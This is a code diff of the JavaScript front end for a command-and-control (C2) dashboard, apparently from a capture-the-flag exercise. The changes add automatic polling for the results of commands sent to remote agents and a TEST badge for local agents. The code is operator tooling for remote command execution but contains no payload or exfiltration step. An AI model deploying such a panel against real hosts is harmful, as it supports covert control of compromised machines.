@@ -1,10 +1,15 @@
-// Dashboard JavaScript - Polling de agents y envío de comandos
-const AUTH_TOKEN = 'supersecret-ctf-token';
+// Dashboard JavaScript - Polling de agents, envío de comandos y auto-polling de resultados
+const AUTH_TOKEN = window.C2_AUTH_TOKEN;
 const API_BASE = '';
-const POLL_INTERVAL = 5000; // 5 segundos
+const POLL_INTERVAL = 5000;      // Agents: 5 segundos
+const RESULT_POLL_INTERVAL = 3000; // Resultados: 3 segundos
+const RESULT_POLL_MAX_ATTEMPTS = 20; // Máximo ~60s de polling por comando
 
 // Almacén de resultados por agent
 const agentResults = {};
+
+// Agents con tareas pendientes de resultado
+const pendingTasks = {}; // agent_id -> { attempts: N, intervalId: N }
 
 // Obtener agents del servidor
 async function fetchAgents() {
@@ -64,15 +69,22 @@ function timeAgo(timestamp) {
     return `${Math.floor(seconds / 3600)}h ago`;
 }
 
+// Detectar si un agente es local (testing)
+function isLocalAgent(agent) {
+    return agent.ip === '127.0.0.1' || agent.ip === '::1' || agent.ip.startsWith('127.');
+}
+
 // Renderizar un agent card
 function renderAgent(agent) {
     const isOnline = agent.status === 'online';
     const result = agentResults[agent.agent_id];
+    const testBadge = isLocalAgent(agent) ? '<span class="agent-badge-test">TEST</span>' : '';
 
     return `
-        <div class="agent-card ${isOnline ? '' : 'offline'}">
+        <div class="agent-card ${isOnline ? '' : 'offline'} ${isLocalAgent(agent) ? 'local-agent' : ''}">
             <div class="agent-header">
                 <span class="agent-id">${agent.agent_id}</span>
+                ${testBadge}
                 <span class="agent-status ${agent.status}">${agent.status}</span>
             </div>
             <div class="agent-info">
@@ -151,21 +163,72 @@ async function executeCommand(agentId) {
         resultDiv.textContent = 'Command sent. Waiting for result...';
         input.value = '';
 
-        // Esperar 2 segundos y refrescar resultados
-        setTimeout(() => refreshResults(agentId), 2000);
+        // Iniciar auto-polling de resultados para este agent
+        startResultPolling(agentId);
     } catch (error) {
         resultDiv.className = 'agent-result visible error';
         resultDiv.textContent = `Error: ${error.message}`;
     }
 }
 
-// Refrescar resultados de un agent
+// Iniciar polling de resultados para un agent específico
+function startResultPolling(agentId) {
+    // Si ya hay polling activo, no duplicar
+    if (pendingTasks[agentId]) {
+        clearInterval(pendingTasks[agentId].intervalId);
+    }
+
+    pendingTasks[agentId] = { attempts: 0 };
+
+    const intervalId = setInterval(async () => {
+        pendingTasks[agentId].attempts++;
+
+        const data = await fetchResults(agentId);
+        const resultDiv = document.getElementById(`result-${agentId}`);
+
+        if (data && data.results && data.results.length > 0) {
+            const latest = data.results[data.results.length - 1];
+            // Verificar si es un resultado nuevo (no el que ya teníamos)
+            const prevOutput = agentResults[agentId]?.output;
+            if (latest.output !== prevOutput) {
+                agentResults[agentId] = { output: latest.output };
+                if (resultDiv) {
+                    resultDiv.className = 'agent-result visible success';
+                    resultDiv.textContent = latest.output;
+                }
+                // Resultado recibido, detener polling
+                stopResultPolling(agentId);
+                return;
+            }
+        }
+
+        // Detener si alcanzamos el máximo de intentos (~60s)
+        if (pendingTasks[agentId]?.attempts >= RESULT_POLL_MAX_ATTEMPTS) {
+            if (resultDiv) {
+                resultDiv.className = 'agent-result visible';
+                resultDiv.textContent = 'Waiting for agent to pick up command (check again later)...';
+            }
+            stopResultPolling(agentId);
+        }
+    }, RESULT_POLL_INTERVAL);
+
+    pendingTasks[agentId].intervalId = intervalId;
+}
+
+// Detener polling de resultados para un agent
+function stopResultPolling(agentId) {
+    if (pendingTasks[agentId]) {
+        clearInterval(pendingTasks[agentId].intervalId);
+        delete pendingTasks[agentId];
+    }
+}
+
+// Refrescar resultados de un agent (botón manual)
 async function refreshResults(agentId) {
     const data = await fetchResults(agentId);
     const resultDiv = document.getElementById(`result-${agentId}`);
 
     if (data && data.results && data.results.length > 0) {
-        // Obtener el último resultado
         const latest = data.results[data.results.length - 1];
         agentResults[agentId] = { output: latest.output };
         resultDiv.className = 'agent-result visible success';
